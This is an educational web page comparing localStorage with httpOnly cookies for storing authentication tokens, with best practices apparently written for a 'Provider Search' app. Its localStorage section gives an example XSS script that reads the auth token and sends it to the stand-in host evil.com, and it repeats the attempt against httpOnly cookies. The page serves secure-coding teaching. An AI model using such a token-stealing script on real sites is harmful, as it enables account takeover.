🍪 Cookie vs localStorage: Security Comparison

Understanding why httpOnly cookies are more secure for authentication tokens

❌ localStorage VULNERABLE

How it works: JavaScript stores and retrieves data freely

1. Store Token

// User logs in, receive token const token = "eyJhbGc..."; localStorage.setItem('auth_token', token);

2. XSS Attack (Malicious Script)

// Attacker injects this via XSS: const stolen = localStorage.getItem('auth_token'); fetch('https://evil.com/steal', { method: 'POST', body: stolen }); // ⚠️ Token successfully stolen!

Visual Flow

User logs in → Token stored in localStorage
Attacker injects malicious script (XSS)
Script reads localStorage.getItem('auth_token')
⚠️ Token stolen! Sent to attacker's server
⚠️ Why This is Dangerous:
Any JavaScript code (including injected XSS) can read localStorage. One successful XSS attack = complete account takeover.

✅ httpOnly Cookie SECURE

How it works: Server sets cookie, JavaScript CANNOT access it

1. Server Sets Cookie

// Server response header (FastAPI/backend): Set-Cookie: auth_token=eyJhbGc...; HttpOnly; Secure; SameSite=Strict // JavaScript cannot set httpOnly cookies! // Only the server can via response headers

2. XSS Attack Attempt (BLOCKED)

// Attacker tries the same attack: const stolen = document.cookie; // Returns: "" (empty) or other non-httpOnly cookies // httpOnly cookies are NOT accessible! fetch('https://evil.com/steal', { method: 'POST', body: stolen // ✅ No auth token here! });

Visual Flow

User logs in → Server sets httpOnly cookie
Attacker injects malicious script (XSS)
Script tries document.cookie
🛡️ BLOCKED! httpOnly flag prevents JavaScript access
✅ Token remains safe, user account protected
✅ Why This is Secure:
The httpOnly flag makes the cookie invisible to JavaScript. Even with XSS, attackers cannot read the token. Browser still sends it automatically with requests!

Feature Comparison

Feature localStorage httpOnly Cookie
JavaScript Access ✗ Fully accessible ✓ Blocked
XSS Protection ✗ Vulnerable ✓ Protected
CSRF Protection ✓ Not vulnerable ✗ Needs CSRF tokens
Auto-sent with Requests ✗ Manual (headers) ✓ Automatic
Cross-domain ✓ Any domain ✗ Same-site (with SameSite)
Storage Limit ~5-10 MB ~4 KB per cookie
Expiration Control ✗ Manual cleanup ✓ Automatic (max-age)
Server-side Control ✗ Client-side only ✓ Server sets/validates

🎯 Best Practices for Provider Search

✅ DO:

  • Use httpOnly cookies for authentication tokens
  • Set Secure flag (HTTPS only)
  • Use SameSite=Strict or Lax
  • Implement CSRF tokens with httpOnly cookies
  • Set appropriate expiration times
  • Use Content Security Policy headers
  • Sanitize and escape all user input

❌ DON'T:

  • Store auth tokens in localStorage
  • Store sensitive data in sessionStorage
  • Trust client-side validation alone
  • Use cookies without httpOnly for auth
  • Skip input sanitization
  • Ignore CSRF protection with cookies

🏗️ Provider Search Implementation:

Authentication Flow:
1. User authenticates via Supabase
2. Supabase manages tokens securely (combination of approaches)
3. FastAPI backend validates tokens on each request
4. CORS configured for specific origins only
5. Rate limiting prevents brute force attacks
6. All sensitive operations require re-authentication

Defense in Depth:
• Content Security Policy headers
• Input validation on frontend AND backend
• SQL injection prevention (parameterized queries)
• Regular security audits and dependency updates
• Logging and monitoring for suspicious activity
